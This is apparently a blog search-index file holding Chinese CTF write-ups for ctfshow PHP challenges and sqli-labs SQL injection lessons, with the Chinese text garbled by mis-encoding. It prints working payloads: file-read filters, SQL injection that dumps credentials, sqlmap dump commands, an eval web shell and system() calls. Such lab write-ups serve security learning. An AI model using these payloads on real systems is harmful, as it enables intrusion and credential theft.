web112\n![](/pic/112.png)\npayload:\n~~~\nphp://filter/resource=flag.php\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\nphp://filter/read=convert.quoted-printable-encode/resource=flag.php\ncompress.zlib://flag.php\n~~~\n[php://filterçš„å„ç§è¿‡æ»¤å™¨](https://blog.csdn.net/qq_44657899/article/details/109300335)\n# web113\n![](/pic/113.png)\npayload:\nå¯ä»¥ç”¨zlibä¼ªåè®®\n~~~\n?file=compress.zlib://flag.php\n~~~\nä¹Ÿå¯ä»¥ç”¨/proc/self/root\n~~~\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\nroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\nc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\nself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\nlf/root/proc/self/root/var/www/html/flag.php\n~~~\n[procç›®å½•çš„åº”ç”¨](https://blog.csdn.net/cosmoslin/article/details/122660083)\n![](/pic/114.png)\ncompressï¼Œå’Œéé¢„æœŸéƒ½è¢«ç¦äº†ï¼Œä½†æ˜¯ä¼ªåè®®æ”¾å‡ºæ¥äº†ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä¼ªåè®®è¯»\npayload:\n~~~\n?file=php://filter/resource=flag.php\n~~~\n# web115\n![](/pic/115.png)\nè€ƒå¯Ÿç‚¹ï¼štrimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡\n~~~\nè¯­æ³•\ntrim(string,charlist)\n\nå‚æ•°\tæè¿°\nstring\t        å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚\ncharlist\t    å¯é€‰ã€‚è§„å®šä»å­—ç¬¦ä¸²ä¸­åˆ é™¤å“ªäº›å­—ç¬¦ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œåˆ™ç§»é™¤ä¸‹åˆ—æ‰€æœ‰å­—ç¬¦ï¼š\n\n\"\\0\"       - NULL\n\"\\t\"       - åˆ¶è¡¨ç¬¦\n\"\\n\"       - æ¢è¡Œ\n\"\\x0B\"     - å‚ç›´åˆ¶è¡¨ç¬¦\n\"\\r\"       - å›è½¦\n\" \"        - ç©ºæ ¼\n~~~\nçœ‹å¸ˆå‚…çš„wpæ‰èƒ½åšå‡ºæ¥ï¼Œåœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹\n~~~\n<?php\n\nfor($i=0;$i<=128;$i++){\n    $str=chr($i).\"1\";\n    if(is_numeric($str)&& trim($str)!=='1'){\n        echo urlencode(chr($i)).\"<br>\";\n    }\n}\n~~~\nå¯ä»¥ç”¨%0cæ¢é¡µï¼Œ\npayload:\n~~~\n?num=%0c36\n~~~\n# web123\n![](/pic/123.png)\n~~~\nGETæˆ–POSTçš„æ–¹å¼ä¼ è¿›å»çš„å˜é‡åï¼Œä¼šè‡ªåŠ¨å°†ç©ºæ ¼ + . [ è½¬æ¢ä¸º_,æƒ³æ„é€ å‡º.ï¼Œéœ€è¦å‰é¢å¸¦ä¸Š[ï¼Œåé¢ç”¨.å°±å¯ä»¥ä¸å˜æˆ_ã€‚\n~~~\n\npayload:\n~~~\nPOST:CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag\n~~~\n# web125\n![](/pic/125.png)\n~~~\n1ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹\n\n\tç¬¬ä¸€ä¸ªå‚æ•°$_SERVER['argv'][0]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°\n\n2ã€webç½‘é¡µæ¨¡å¼ä¸‹\n\n\tåœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹\n\t\n    è®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ\n\n    è¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™]\n\n    $argv,$argcåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨\n~~~\npayload:\n~~~\npayload:\nget:  $fl0g=flag_give_me;\npost:  CTF_SHOW=1&CTF%5bSHOW.COM=1&fun=eval($a[0])\n~~~","tags":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"],"categories":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"]},{"title":"ctfshow webå…¥é—¨105~109","url":"/2023/02/26/ctfshow-webå…¥é—¨105/","content":"![](/pic/105.png)\n~~~\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    } \n~~~\nè¿™ä¸€æ®µè¯´getä¼ çš„å€¼ä¸èƒ½ç­‰äºerrorã€‚\n~~~\nforeach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    } \n~~~\nè¿™ä¸€æ®µè¯´POSTä¼ çš„å€¼ä¸èƒ½ç­‰äºflagã€‚\n~~~\nif(!($_POST['flag']==$flag)){\n    die($error);\n} \n~~~\nè¿™ä¸€æ®µè¯´POSTä¼ çš„å€¼ä¸ç­‰äºflagçš„è¯è¾“å‡ºå˜é‡errorã€‚\npayload:\n~~~\nGET:?a=flag\nPOST:error=a\n~~~\n<!--more-->\n# web106\n![](/pic/106.png)\nè¿™é“é¢˜å°±æ¯”web105å¤šä¸€ä¸ªæ¯”è¾ƒã€‚\npayload:\n~~~\nGET:v2[]=1\nPOST:v1[]=2\n~~~\n# web107\n![](/pic/107.png)\n~~~\nparse_str(string,array)\næŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚\nstringå¿…é€‰ã€‚è§„å®šè¦è§£æçš„å­—ç¬¦ä¸²\narrayå¯é€‰ã€‚è§„å®šå­˜å‚¨å˜é‡çš„æ•°ç»„çš„åç§°ã€‚\n~~~\né¢˜ç›®å°±æ˜¯æŠŠv1çš„å€¼èµ‹ç»™v2ï¼Œç„¶åè®©v2çš„å€¼å’Œv3çš„MD5å€¼ç›¸åŒã€‚\npayload:\n~~~\nGET:?v3=a\nPOST:v1=flag=0cc175b9c0f1b6a831c399e269772661\n~~~\nMD5æ²¡åŠæ³•å¤„ç†æ•°ç»„ã€‚\n~~~\nGET:?v3=a\nPOST:v1=   #ç©º\n~~~\n# web108\nè¿æ¥ä¸åˆ°æœåŠ¡å™¨.....\n# web109\næ‰¾ä¸åˆ°æœåŠ¡å™¨......","tags":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"],"categories":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"]},{"title":"Hello World","url":"/2023/02/26/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"},{"title":"sqli-labs","url":"/2023/02/20/sqli-labs/","content":"# less-1\n![](/pic/sqli/1.png)\nçœ‹æŠ¥é”™å¯çŸ¥ï¼Œè¿™æ˜¯é—­åˆå•å¼•å·ã€‚\n~~~\n?id=1'order by 3 -- - #ç¡®å®šé‚£ä¸ªå­—æ®µæœ‰å›æ˜¾\n?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- - #æŸ¥è¯¢è¡¨å\n?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- -  #æŸ¥è¯¢åˆ—å\n?id=-1'union select 1,2,group_concat(username,'~',password) from users -- - #æŸ¥è¯¢å½“å‰æ•°æ®åº“userè¡¨é‡Œé¢çš„usernameå’Œpasswordã€‚\n~~~\n<!--more-->\nç”¨sqlmapæ›´ç®€å•\n~~~\nsqlmap -u \"ip?id=1\"\nsqlmap -u \"ip?id=1\" -dbs #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“\nsqlmap -u \"ip?id=1\" -D security -tables #åˆ—å‡ºå½“å‰æ•°æ®åº“é‡Œçš„è¡¨\nsqlmap -u \"ip?id=1\" -D security -T users -columns #åˆ—å‡ºè¡¨é‡Œçš„åˆ—\nsqlmap -u \"ip?id=1\" -D security -T users -C username,password --dump #è·å–è¡¨é‡Œçš„æ•°æ®\n~~~\n# less-2\n![](/pic/sqli/2.png)\nè¿™ä¸€é¢˜å°±ä¸ç”¨é—­åˆï¼Œå‰©ä¸‹çš„å’Œç¬¬ä¸€é¢˜ä¸€æ ·ã€‚\n~~~\n?id=1 order by 3 -- - \n?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -\n?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- - \n?id=-1 union select 1,2,group_concat(username,'~',password) from users -- - \n~~~\n# less-3\n![](/pic/sqli/3.png)\nçœ‹é”™è¯¯æç¤ºå¯çŸ¥ï¼Œéœ€è¦ç”¨`')`æ¥é—­åˆï¼Œå‰©ä¸‹çš„å’Œç¬¬ä¸€é¢˜ä¸€æ ·ã€‚\n~~~\n?id=1') order by 3 -- - \n?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -\n?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- - \n?id=-1') union select 1,2,group_concat(username,'~',password) from users -- - \n~~~\n# less-4\n![](/pic/sqli/4.png)\nçœ‹é”™è¯¯æç¤ºï¼Œå¯çŸ¥é—­åˆæ–¹å¼æ˜¯`\")`ï¼Œä½†æ˜¯å•å¼•å·ä¸ä¼šæŠ¥é”™,å‰©ä¸‹çš„å’Œç¬¬ä¸€é¢˜ä¸€æ ·ã€‚\n~~~\n?id=1\") order by 3 -- - \n?id=-1\") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- -\n?id=-1\") union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' -- - \n?id=-1\") union select 1,2,group_concat(username,'~',password) from users -- - \n~~~\n# less-5\n![](/pic/sqli/5.png)\næ ¹æ®é”™è¯¯å¯ä»¥åˆ¤æ–­æ˜¯å•å¼•å·æŠ¥é”™ã€‚è”åˆæ³¨å…¥ä¹Ÿæ²¡æœ‰åŠæ³•ç”¨ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚\nextractvalueå‡½æ•°\npayload:id='and(select extractvalue(\"anything\",concat('~',(selectè¯­å¥))))\n~~~\nå‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)\næ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);\nç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°\nç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²\nä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²\n~~~\npayloadï¼š\n~~~\n?id=-1'and (select extractvalue(1,concat(\"~\",(select database()))))-- - #è·å–å½“å‰æ•°æ®åº“çš„åç§°\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))))-- -\n#æŸ¥è¯¢å½“å‰æ•°æ®åº“é‡Œæ‰€æœ‰çš„è¡¨\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,31))))-- -\n#æŸ¥è¯¢è¡¨é‡Œåˆ—çš„åç§°\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(username,'~',password) from users),1,31))))-- -\n#æŸ¥è¯¢è¡¨é‡Œé¢çš„å†…å®¹\n\n\n\n# extractvalue()å‡½æ•°èƒ½æ˜¾ç¤ºçš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œæ‰€ä»¥ç”¨substr()å‡½æ•°æ¥åˆ†é¡µï¼Œæˆ–è€…ä½¿ç”¨limitåˆ†é¡µä¹Ÿå¯ä»¥ã€‚concat()é‡Œé¢çš„~ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„ã€‚\n~~~\n\nupdatexml:\npayload:id='and(select updatexml(\"anything\",concat('~',(selectè¯­å¥())),\"anything\"))\n~~~\n?id=-1'and updatexml(1,concat('~',(select database())),1)-- -\n?id=-1'and updatexml(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema=database() )),1)-- -\n?id=-1'and updatexml(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users' )),1)-- -\n?id=-1'and (select extractvalue(1,concat(\"~\",substr((select group_concat(username,'~',password) from users),1,31))))-- -\n~~~\n\nfloor:\npayload:'union select 1 from (select count(*),concat((slelectè¯­å¥),floor(rand(0)*2))x from \"ä¸€ä¸ªè¶³å¤§çš„è¡¨\" group by x)a\n# less-6\né—­åˆæ–¹å¼ä¸º`\"`ï¼ŒæŠ¥é”™æ³¨å…¥ä»å¯è¡Œã€‚\n# less-7\næ–‡ä»¶è¯»å†™æ³¨å…¥ï¼Œä½†æ˜¯æˆ‘æ€ä¹ˆè¿è¡Œæ–‡ä»¶éƒ½ä¸å†™å…¥ï¼Œæ”¾å¼ƒäº†ã€‚\n# less-8\nå¸ƒå°”ç›²æ³¨ã€‚\n~~~\n?id=-1'and (ascii(substr(select database()),1,1))==115--+ #åˆ¤æ–­ç¬¬ä¸€ä¸ªæ•°æ®åº“åå­—ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯å¦ç­‰äº115\n?id=1' and (ascii(substr((select database()) ,2,1))) = 101 --+ #åˆ¤æ–­ç¬¬ä¸€ä¸ªæ•°æ®åº“åå­—ç¬¬äºŒä¸ªå­—ç¬¦çš„asciiç æ˜¯å¦ç­‰äº101\n?id=1'and (length(database())) = 8 --+ #åˆ¤æ–­æ•°æ®åº“åå­—çš„é•¿åº¦æ˜¯å¦ç­‰äº8\n?id=1'and (length(select table_name from information_schema.tables where table_schema='security' limit 3,1)) = 5 --+ #åˆ¤æ–­åœ°ä¸‰å¼ è¡¨åå­—çš„é•¿åº¦æ˜¯å¦ä¸º5\n?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 1,1))) = 8 --+ #åˆ¤æ–­usersè¡¨é‡Œåœ°äºŒä¸ªåˆ—åçš„é•¿åº¦æ˜¯å¦ä¸º8\n~~~\nå¦‚æœåˆ¤æ–­æ­£ç¡®çš„è¯ï¼Œé¡µé¢è¿”å›æ­£å¸¸ã€‚\nå¥½éº»çƒ¦å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šã€‚\n# less-9\næ—¶é—´ç›²æ³¨\n~~~\nid=1' and if(length(database())>3 ,sleep(5),1) -- - #å¦‚æœæ•°æ®åº“é•¿åº¦é•¿äº3çš„è¯ï¼Œå»¶è¿Ÿ5ç§’è¿”å›é¡µé¢ã€‚\n~~~\n[MySQLæ—¶é—´ç›²æ³¨äº”ç§å»¶æ—¶æ–¹æ³• ](https://www.cnblogs.com/forforever/p/13019703.html)\n# less-10\nè¿˜æ˜¯æ—¶é—´ç›²æ³¨ï¼Œé—­åˆæ–¹å¼ä¸º`\"`ã€‚\n# less-11\n![](/pic/sqli/11.png)\nè¿™ä¸ªå°±åœ¨usernameä¸Šç›´æ¥è¾“å…¥sqlè¯­å¥å°±è¡Œã€‚\nä¹Ÿå¯ä»¥ç”¨hackbarï¼ŒPostä¼ å‚ã€‚å…¶ä»–è¯­å¥ä¸å˜ã€‚.\n\n","tags":["sqlæ³¨å…¥"],"categories":["web"]},{"title":"ctfshow webå…¥é—¨101~104","url":"/2023/02/18/ctfshow-webå…¥é—¨101~104/","content":"# web101\n![](/pic/101.png)\n~~~\nå½“æ–°å»ºReflectionClassç±»å¹¶ä¼ å…¥PHPä»£ç æ—¶ï¼Œä¼šè¿”å›ä»£ç çš„è¿è¡Œç»“æœï¼Œå¯ä»¥é€šè¿‡echoæ˜¾ç¤º\nå³ä½¿ä¼ å…¥äº†ç©ºçš„æ‹¬å·ï¼Œä»£ç ä¾æ—§å¯ä»¥è¿è¡Œï¼Œä¸”error_reporting(0)çš„å­˜åœ¨é˜»æ­¢äº†æŠ¥é”™\n~~~\nv1å¿…é¡»æ˜¯æ•°å­—ï¼Œv2å¯ä»¥ä½¿ç”¨å¯ä»¥ä½¿ç”¨åå°„ç±»new ReflectionClass(),v3æ²¡æœ‰è¿‡æ»¤`;`ã€‚\npayload:\n~~~\nv1=1&v2=echo new Reflectionclass&v3=;\n~~~\n0x2dè¿˜æ˜¯-ï¼Œç„¶åæœ€åä¸€ä½éœ€è¦è‡ªå·±çŒœã€‚\n# web102\n![](/pic/102.png)\n~~~\nis_numeric() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚å¦‚æœå­—ç¬¦ä¸²ä¸­å«æœ‰ä¸€ä¸ªeä»£è¡¨ç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå¯è¿”å›true\n\ncall_user_func() å‡½æ•°ç”¨äºè°ƒç”¨æ–¹æ³•æˆ–è€…å˜é‡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯è°ƒç”¨çš„å‡½æ•°çš„å‚æ•°\n\nfile_put_contents() å‡½æ•°åº”è¯¥éƒ½ç†Ÿæ‚‰äº†ï¼Œå†™å…¥å†…å®¹åˆ°æ–‡ä»¶ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†…å®¹\n~~~\nè¦ç¡®ä¿v4ä¸ºçœŸï¼Œå°±è¦ç¡®ä¿v2æ˜¯æ•°å­—.å°†v2è¿›è¡Œbase64ç¼–ç ç„¶åå†è½¬æ¢æˆ16è¿›åˆ¶ã€‚\npayloadï¼š\n~~~\nv2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=2.php\nPOSTï¼šv1=hex2bin\n~~~\nç„¶åè®¿é—®2.phpæŸ¥çœ‹æºç å°±èƒ½æ‰¾åˆ°flagã€‚\n# web103\næ‰¾ä¸åˆ°æœåŠ¡å™¨ï¼Œåšä¸äº†é¢˜.\n# web104\n![](/pic/104.png)\nå› ä¸ºæ²¡æœ‰åˆ¤æ–­ï¼Œå¯ä»¥ç›´æ¥è®©ä¸¤ä¸ªå€¼ç›¸ç­‰ï¼Œä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸¤ä¸ªç›¸ç­‰çš„sha1çš„å€¼ã€‚\n~~~\naaK1STfY\n0e76658526655756207688271159624026011393\naaO8zKZF\n0e89257456677279068558073954252716165668\n~~~\n","tags":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"],"categories":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"]},{"title":"ctfshow web97~100","url":"/2023/02/07/ctfshow-webå…¥é—¨97~100/","content":"# web97\n![](/pic/97.png)\nè¦æ±‚POSTä¼ å‚ï¼Œaä¸èƒ½ç­‰äºbï¼Œä½†æ˜¯aå’Œbçš„md5å€¼è¦ç›¸åŒï¼Œä½†æ˜¯md5è¿™ä¸ªå‡½æ•°å‘¢æœ‰ä¸ªæ¼æ´ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºæ•°ç»„çš„æ—¶å€™ä¼šå‘ç”Ÿé”™è¯¯ï¼Œå¹¶è¿”å›NULLã€‚\n~~~\na[]=123&b[]=1234\n~~~\n<!--more-->\n# web98\n![](/pic/98.png)\n~~~\nåˆ†æä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºæ¥ï¼Œåªè¦æœ‰è¾“å…¥çš„getå‚æ•°å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•\nçš„åœ°å€ï¼‰ï¼Œè€Œç¬¬äºŒä¸‰è¡Œä»£ç æ²¡å•¥ç”¨ï¼Œæˆ‘ä»¬ç”¨ä¸åˆ°ï¼Œç›´æ¥çœ‹ç¬¬å››è¡Œï¼Œå¦‚æœgetå‚æ•°HTTP_FLAGçš„å€¼ä¸º\nflagï¼Œå°±è¯»å–æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¾“å‡ºflagã€‚æ‰€ä»¥æ€è·¯å°±æœ‰äº†ï¼Œæˆ‘ä»¬é€šè¿‡getéšä¾¿ä¼ ä¸€ä¸ªå‚æ•°å¹¶èµ‹å€¼ï¼Œ\nç„¶åæˆ‘ä»¬é€šè¿‡postè¯·æ±‚ä¼ HTTP_FLAGå‚æ•°å¹¶èµ‹å€¼ä¸ºflagå³å¯è·å¾—flagã€‚\n~~~\n~~~\nGET:?1=1\nPOST:HTTP_FLAG=flag\n~~~\n# web99\n![](/pic/99.png)\n~~~\n array()ï¼Œæ˜¯ç©ºæ•°ç»„å®šä¹‰ï¼Œé¢˜ä¸­å®šä¹‰äº†$allowä¸ºç©ºæ•°ç»„\n0x36dï¼Œå…¶åè¿›åˆ¶ä¸º877\nrand()ï¼Œè¿”å›éšæœºæ•´æ•°\narray_push()ï¼Œæ˜¯å‘æ•°ç»„å°¾éƒ¨æ’å…¥æ–°çš„å€¼\nfile_put_contents()ï¼Œå†™æ–‡ä»¶\n~~~\nå› ä¸ºin_arrayç¬¬ä¸‰ä¸ªå‚æ•°æ²¡è®¾ç½®ä¸ºtrueï¼Œæ‰€ä»¥è¯¥å‡½æ•°æ˜¯å®½æ¾æ¯”è¾ƒï¼ˆ==ï¼‰ï¼Œå­—ç¬¦ä¸²å‹ä¼šå…ˆè½¬åŒ–ä¸ºæ•´å‹å†æ¯”è¾ƒï¼Œåªè¦å€¼ç›¸åŒå°±å¯ä»¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å‚å†™æœ¨é©¬è¿›å».\n~~~\n?n=1.php\ncontent=<?php @eval($_POST[1]);?>\n~~~\nç„¶åç”¨èšå‰‘è¿æ¥\n# web100\n![](/pic/100.png)\nis_numeric() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²,å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚\nv1ä¸€å®šè¦æ˜¯ä¸ªæ•°å­—ï¼Œv2ä¸èƒ½æœ‰åˆ†å·ï¼Œv3å¿…é¡»æœ‰åˆ†å·ã€‚\n~~~\nget:/?v1=1&v2=eval($_POST[1])?> %23&v3=;\npost:1=system(\"tac ctfshow.php\");\n~~~\n~~~\n$flag_is_3110c36f0x2df28a0x2d4b840x2dbe0f0x2d2c4f600a4b95;\n~~~\n0x2dæ˜¯-ï¼Œæ¢ä¸ŠååŠ ä¸Šctfshow{}å°±å¯ä»¥äº†","tags":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"],"categories":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"]},{"title":"ctfshow web89~96","url":"/2023/02/02/89/","content":"# web89\n![](/pic/89.png)\nç”¨æ•°ç»„ç»•è¿‡å°±è¡Œã€‚\npayload:\n~~~\n?num[]=a;\n~~~\n<!--more-->\n# web90\n![](/pic/90.png)\n~~~\nintval( mixed $var[, int $base = 10] ) : int\n\nvar\nè¦è½¬æ¢æˆ integer çš„æ•°é‡å€¼\nbase\nè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ \nNote: \nå¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š \nâ—¦ å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† \"0x\" (æˆ– \"0X\") çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ  \nâ—¦ å¦‚æœå­—ç¬¦ä¸²ä»¥ \"0\" å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ  \nâ—¦ å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚ \n~~~\nåªéœ€è¦æäº¤0x117cå°±è¡Œï¼Œ0x117cæ˜¯16è¿›åˆ¶çš„4476ï¼Œä¹Ÿå¯ä»¥æäº¤4476+å­—ç¬¦ã€‚\npayload:\n~~~\n?num=0x117c\n?num=4476a\n~~~\n# web91\n![](/pic/91.png)\nç¬¬ä¸€æ¬¡æ˜¯/imç¬¬äºŒæ¬¡æ˜¯/i\n/imå¯ä»¥åŒ¹é…å¤šè¡Œï¼Œ/iåªèƒ½åŒ¹é…ä¸€è¡Œã€‚\næ‰€ä»¥è®©ä»–ç¬¬ä¸€æ¬¡åŒ¹é…åˆ°phpç¬¬äºŒæ¬¡åŒ¹é…ä¸åˆ°phpã€‚\npayload:\n~~~\n?cmd=1%0aphp\n~~~\n# web92\n![](/pic/92.png)\nå¯ä»¥æ¢ä¸ªè¿›åˆ¶ç»•è¿‡\n~~~\n?num=0x117c\n~~~\næˆ–è€…è¿˜æœ‰eè¿™ä¸ªä¸œè¥¿\n~~~\nintval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å– ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡å‰é¢çš„==4476æˆ‘ä»¬å°±å¯ä»¥æ„é€  4476e123 å…¶å®ä¸éœ€è¦æ˜¯eå…¶ä»–çš„å­—æ¯ä¹Ÿå¯ä»¥\n~~~\n\n~~~\n?num=4476e123\n~~~\n# web93\n![](/pic/93.png)\nå¯ä»¥ç”¨å°æ•°ï¼Œä¹Ÿå¯ä»¥ç”¨8è¿›åˆ¶\npayload:\n~~~\n?num=4476.1\n?num=010574\n~~~\n~~~\näºŒè¿›åˆ¶0bxxx\nå…«è¿›åˆ¶0xxxxxx\nåå…­è¿›åˆ¶0xaaaa\n~~~\n# web94\n![](/pic/94.png)\nstrposæ˜¯åŒ¹é…å­—ç¬¦ï¼Œå¿…é¡»è¦åŒ¹é…åˆ°0è€Œä¸”è¿˜ä¸èƒ½åœ¨ç¬¬ä¸€ä½ï¼Œå¯ä»¥ç”¨8è¿›åˆ¶ä¹Ÿå¯ä»¥ç”¨å°æ•°ã€‚\nå¦‚æœç”¨8è¿›åˆ¶çš„è¯å¿…é¡»åœ¨å¼€å¤´åŠ ä¸€ä¸ªç©ºæ ¼ã€‚\npayload:\n~~~\n?num=4476.0\n/?num= 010574\n~~~\n# web95\n![](/pic/95.png)\nè¿™ä¸€é“é¢˜å¤šè¿‡æ»¤äº†ä¸€ä¸ªç‚¹ï¼Œæ‰€ä»¥æ²¡æ³•ç”¨å°æ•°äº†ï¼Œå…¶ä»–çš„è·Ÿä¸Šä¸€é“é¢˜ä¸€æ ·ã€‚\npayload:\n~~~\n?num= 010574\n~~~\n# web96\n![](/pic/96.png)\næƒ³åŠæ³•è¯»å–flag.phpè¿˜ä¸èƒ½ç›´æ¥ä¼ flag.phpï¼Œåˆ©ç”¨è·¯å¾„æˆ–è€…phpåè®®å°±è¡Œã€‚\npayload:\n~~~\n?u=/var/www/html/flag.php\n?u=./flag.php\n?u=php://filter/resource=falg.php\n~~~","tags":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"],"categories":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"]},{"title":"ctfshow webå…¥é—¨87~88","url":"/2023/01/31/ctfshow-webå…¥é—¨87/","content":"# web87\n![](/pic/87.png)\n[è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨](https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list)\n<!--more-->\n~~~\nå°† php://filter/write=convert.base64-decode/resource=123.php 